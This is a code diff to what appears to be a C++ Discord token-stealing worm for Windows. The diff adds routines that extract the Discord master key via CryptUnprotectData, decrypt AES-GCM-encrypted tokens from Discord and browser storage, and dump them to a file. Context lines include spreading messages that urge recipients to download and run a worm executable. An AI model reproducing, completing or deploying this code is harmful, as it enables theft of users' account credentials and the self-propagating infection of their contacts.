@@ -9,6 +9,12 @@
 #include <sstream>
 #include <thread>
 #include <vector>
+#include "base64.hpp"
+#include <wincrypt.h>
+#include <cryptopp/aes.h>
+#include <cryptopp/gcm.h>
+#include <cryptopp/base64.h>
+#include <cryptopp/filters.h>
 
 #define DM_MESSAGE "Hello please download and run this :) https://example.com/worm.exe"
 #define SERVER_MESSAGE "Hello I am in a server, please download and run this :) https://example.com/worm.exe"
@@ -23,13 +29,44 @@ using namespace nlohmann;
 #define FIND(needle, haystack) std::find(haystack.begin(), haystack.end(), needle) != haystack.end()
 
 regex tokenPattern(X("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}"));
-regex mfaTokenPattern(X("mfa\\.[\\w-]{84}"));
+regex encryptedPattern(X("dQw4w9WgXcQ:[^\"]*"));
 vector<string> tokens;
 vector<string> channelsSentIn;
 
-void FindTokens(const path path) {
+void FindTokens(const path path, bool encrypted = false) {
 	const auto leveldb = path / X("Local Storage") / X("leveldb");
 	if (!exists(leveldb))
+		return;
+
+	const auto localState = path / X("Local State");
+	if (encrypted && !exists(localState))
+		return;
+
+	// Credit to @addi00000 for this
+	std::string master_key;
+	if (encrypted) {
+		// Get encryption key
+		ifstream ifs(localState);
+		json j;
+		ifs >> j;
+		ifs.close();
+
+		const auto key = j[X("os_crypt")][X("encrypted_key")].get<string>();
+		const auto keyBytes = base64::from_base64(key).substr(5);
+		// Wincrypt CryptUnprotectData, no entropy
+		DATA_BLOB dataIn, dataOut, entropy;
+		dataIn.pbData = (BYTE*)keyBytes.data();
+		dataIn.cbData = keyBytes.size();
+		entropy.pbData = NULL;
+		entropy.cbData = 0;
+
+		if (CryptUnprotectData(&dataIn, NULL, &entropy, NULL, NULL, 0, &dataOut)) {
+			master_key = string((char*)dataOut.pbData, dataOut.cbData);
+			LocalFree(dataOut.pbData);
+		}
+	}
+
+	if (encrypted && master_key.empty())
 		return;
 
 	for (const auto &file : directory_iterator(leveldb)) {
@@ -42,11 +79,34 @@ void FindTokens(const path path) {
 		buffer << t.rdbuf();
 		string s = buffer.str();
 
-		for (auto it = sregex_iterator(s.begin(), s.end(), mfaTokenPattern); it != sregex_iterator(); ++it) {
-			const auto token = it->str();
-			if (FIND(token, tokens))
+		for (auto it = sregex_iterator(s.begin(), s.end(), encryptedPattern); it != sregex_iterator(); ++it) {
+			const auto encrypted = it->str();
+			const auto encryptedBytes = base64::from_base64(encrypted.substr(encrypted.find(':') + 1));
+
+			const auto iv = encryptedBytes.substr(3, 12);
+			const auto payload = encryptedBytes.substr(15);
+
+			string decrypted;
+			// aes-128-gcm
+			try {
+				CryptoPP::GCM<CryptoPP::AES>::Decryption d;
+				d.SetKeyWithIV((const ::byte*)master_key.data(), master_key.size(), (const ::byte*)iv.data(), iv.size());
+				CryptoPP::StringSource s(payload, true,
+					new CryptoPP::AuthenticatedDecryptionFilter(d,
+						new CryptoPP::StringSink(decrypted),
+						CryptoPP::AuthenticatedDecryptionFilter::DEFAULT_FLAGS,
+						16
+					)
+				);
+			}
+			catch (const CryptoPP::Exception& e) {
 				continue;
-			tokens.push_back(token);
+			}
+			
+			if (FIND(decrypted, tokens))
+				continue;
+
+			tokens.push_back(decrypted);
 		}
 
 		for (auto it = sregex_iterator(s.begin(), s.end(), tokenPattern); it != sregex_iterator(); ++it) {
@@ -82,11 +142,14 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine,
 	auto local = path(getenv("LOCALAPPDATA"));
 	auto roaming = path(getenv("APPDATA"));
 
-	const auto paths = {
+	const auto encryptedPaths = {
 		roaming / X("Discord"),															 // Discord
 		roaming / X("discordcanary"),													 // Discord Canary
 		roaming / X("discordptb"),														 // Discord PTB
 		roaming / X("Lightcord"),														 // Lightcord
+	};
+
+	const auto paths = {
 		roaming / X("Opera Software") / X("Opera Stable"),								 // Opera
 		roaming / X("Opera Software") / X("Opera GX Stable"),							 // Opera GX Stable
 		local / X("Amigo") / X("User Data"),											 // Amigo
@@ -108,11 +171,21 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine,
 	// Find tokens, use threads to improve performance
 	vector<thread> tokenFinderThreads;
 	for (const auto &path : paths) {
-		tokenFinderThreads.push_back(thread(FindTokens, path));
+		tokenFinderThreads.push_back(thread(FindTokens, path, false));
+	}
+
+	for (const auto &path : encryptedPaths) {
+		tokenFinderThreads.push_back(thread(FindTokens, path, true));
 	}
 
 	for (auto &t : tokenFinderThreads) {
 		t.join();
+	}
+
+	// save all tokens to tokens.txt
+	std::ofstream tokensFile(X("tokens.txt"));
+	for (const auto &token : tokens) {
+		tokensFile << token << std::endl;
 	}
 
 	vector<string> usedAccounts;
